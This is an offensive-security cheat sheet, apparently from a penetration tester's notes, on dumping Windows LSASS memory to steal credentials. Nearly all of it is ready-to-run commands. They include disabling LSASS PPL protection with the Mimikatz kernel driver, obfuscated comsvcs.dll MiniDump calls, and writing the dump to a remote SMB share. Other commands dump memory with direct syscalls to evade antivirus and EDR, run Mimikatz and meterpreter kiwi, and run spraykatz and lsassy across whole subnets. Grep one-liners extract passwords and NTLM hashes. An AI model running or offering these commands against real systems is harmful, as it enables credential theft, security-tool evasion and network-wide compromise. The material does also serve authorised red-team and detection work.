---
description: Local Security Authority Subsystem Service
---

# lsass.exe




## Enumeration

Check if lsass.exe is ran as a protected process (PPL):

```
PS > Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```




## Reusing Open Handles



### Pypykatz

* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
* [https://github.com/skelsec/pypykatz/releases/latest](https://github.com/skelsec/pypykatz/releases/latest)

```
Cmd > .\pypykatz.exe live lsa --method handledup
```



### SharpHandler

* [https://github.com/jfmaes/SharpHandler](https://github.com/jfmaes/SharpHandler)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHandler.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHandler.ps1)

Scan if there are dupeable handles to use:

```
PS > Invoke-SharpHandler -C "-s"
```

Write a gzip-compressed minidump to specified location:

```
PS > Invoke-SharpHandler -C "-w -c -l=C:\Windows\Temp\pony.dat"
```

Dump and parse with SharpKatz's `logonpasswords`:

```
PS > Invoke-SharpHandler -C "-d"
```



### HandleKatz

- [https://github.com/codewhitesec/HandleKatz](https://github.com/codewhitesec/HandleKatz)

```
$ x86_64-w64-mingw32-gcc -o loader.exe loader.cpp -lcrypt32
Cmd > .\loader.exe --pid:852 --outfile:C:\Windows\Temp\dump.obfuscated
```




## Silent Process Exit

* [https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
* [https://github.com/deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)
* [https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit](https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit)
* [https://github.com/CompassSecurity/PowerLsassSilentProcessExit](https://github.com/CompassSecurity/PowerLsassSilentProcessExit)




## Remove PPL Protection

- [https://github.com/itm4n/PPLdump](https://github.com/itm4n/PPLdump)
- [https://github.com/RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

Using Mimikatz driver:

```
PS > cmd /c sc create mimidrv binPath= C:\Windows\Tasks\mimidrv.sys type= kernel start= demand
PS > cmd /c sc start mimidrv
PS > Invoke-Mimikatz -Command '"!processprotect /process:lsass.exe /remove" "exit"'
```




## Tools



### comsvcs.dll

* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
* [https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e](https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e)

```
PS > $proc = 'ls'+'Ass'
PS > Get-Process $proc
PS > rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PROCESS_PID> C:\Windows\System32\spool\drivers\color\pony.dat full
```

Not touching the disk (using an SMB share):

```
PS > net use z: \\10.10.13.37\share
PS > rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump (Get-Process ('ls'+'Ass')).id z:\pony.dat full
```

One-liner:

```
Cmd > %COMSPEC% /Q /c echo powershell.exe -NoP -C "%WINDIR%\System32\rundll32.exe %WINDIR%\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id %WINDIR%\Temp\pony.arj full;Wait-Process -Id (Get-Process rundll32).Id" 2^>^&1 > temp.bat & %COMSPEC% /Q /c temp.bat & del temp.bat
```



### ProcDump

* [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
* [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)

Dump and parse:

```
PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
$ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
Or
Cmd > .\mimikatz.exe "sekurlsa::minidump out.txt" "exit"
```

Grep for secrets:

```
 # Mimikatz
$ grep -a '* Username : ' out.txt -A2 | grep -a -e Username -e Password -e NTLM | grep -a -v null | xclip -i -sel c
 # Pypykatz
$ grep -a -P '\tusername ' out.txt -A2 | grep -a -e username -e password | grep -a -v None | xclip -i -sel c
$ grep -a -P 'Username: ' out.txt -A4 | grep -a -e Username -e Domain -e NT | grep -a -v None | xclip -i -sel c
```



### Mimikatz

In case of Windows 10 version 1803-1809 use [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip), see [Key import error](https://github.com/gentilkiwi/mimikatz/issues/248):

```
Cmd > .\mimikatz.exe "privilege::debug" "token::elevate" "log out.txt" "sekurlsa::logonpasswords full" "exit"
```


#### kiwi

```
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_all
meterpreter > lsa_dump_secrets
meterpreter > kiwi_cmd '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "exit"'
```



### spraykatz

* [https://github.com/aas-n/spraykatz](https://github.com/aas-n/spraykatz)

```
$ python3 spraykatz.py -u snovvcrash -p 'Passw0rd!' -t 10.10.13.37,10.10.13.38,10.10.13.39
```



### Dumpert

* [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
* [https://github.com/outflanknl/Dumpert](https://github.com/outflanknl/Dumpert)

Dump lsass.exe using direct syscalls and removing user-land API hooks:

```
Cmd > rundll32.exe .\Outflank-Dumpert-DLL.dll,Dump
```

Using [sRDI](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/) (**s**hellcode **R**eflective **D**LL **I**njection) technique:

1. Compile [*Outflank-Dumpert-DLL.dll*](https://github.com/outflanknl/Dumpert/tree/master/Dumpert-DLL).
2. Convert it to position independent shellcode with [*ConvertToShellcode.py*](https://github.com/monoxgas/sRDI/blob/master/Python/ConvertToShellcode.py): `python3 ConvertToShellcode.py Outflank-Dumpert-DLL.dll`.
3. Use a shellcode loader of your choice to dump LSASS.



### lsassy

* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
* [https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/lsassy.py)
* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

```
$ lsassy 10.10.13.0/24 -d megacorp.local -u snovvcrash -p 'Passw0rd!'
$ cme smb 10.10.13.0/24 -u snovvcrash -p 'Passw0rd!' -M lsassy
```
